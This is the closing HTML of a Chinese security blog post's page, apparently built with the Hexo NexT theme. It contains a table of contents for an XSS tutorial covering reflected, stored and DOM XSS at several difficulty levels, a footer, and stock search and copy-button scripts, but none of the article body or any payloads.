+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS简介"><span class="nav-number">1.</span> <span class="nav-text">XSS简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#常见XSS利用方式"><span class="nav-number">2.</span> <span class="nav-text">常见XSS利用方式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#反射型XSS"><span class="nav-number">3.</span> <span class="nav-text">反射型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LOW级别"><span class="nav-number">3.1.</span> <span class="nav-text">LOW级别</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS的一般收集方式"><span class="nav-number">3.1.1.</span> <span class="nav-text">XSS的一般收集方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium级别"><span class="nav-number">3.2.</span> <span class="nav-text">Medium级别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High级别"><span class="nav-number">3.3.</span> <span class="nav-text">High级别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible级别"><span class="nav-number">3.4.</span> <span class="nav-text">Impossible级别</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#存储型XSS"><span class="nav-number">4.</span> <span class="nav-text">存储型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LOW级别-1"><span class="nav-number">4.1.</span> <span class="nav-text">LOW级别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium级别-1"><span class="nav-number">4.2.</span> <span class="nav-text">Medium级别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High级别-1"><span class="nav-number">4.3.</span> <span class="nav-text">High级别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible级别-1"><span class="nav-number">4.4.</span> <span class="nav-text">Impossible级别</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DOM型XSS"><span class="nav-number">5.</span> <span class="nav-text">DOM型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LOW级别-2"><span class="nav-number">5.1.</span> <span class="nav-text">LOW级别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium级别-2"><span class="nav-number">5.2.</span> <span class="nav-text">Medium级别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High级别-2"><span class="nav-number">5.3.</span> <span class="nav-text">High级别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible级别-2"><span class="nav-number">5.4.</span> <span class="nav-text">Impossible级别</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS防御"><span class="nav-number">6.</span> <span class="nav-text">XSS防御</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LoongEyes</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共160.9k字</span>
+</div>
+
+
+<div style="width:400px;margin:0 auto; padding:20px 0;">
+	<div style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="/images/beiantubiao.png" alt="备案标识"/></div>
+	<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=37010302000766" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">鲁公网安备 37010302000766号</p></a>
+	<div style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">鲁ICP备19025353号</p></div>
+</div>
+ 
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('复制成功')
+          else $(this).text('复制失败')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+</body>
+</html>
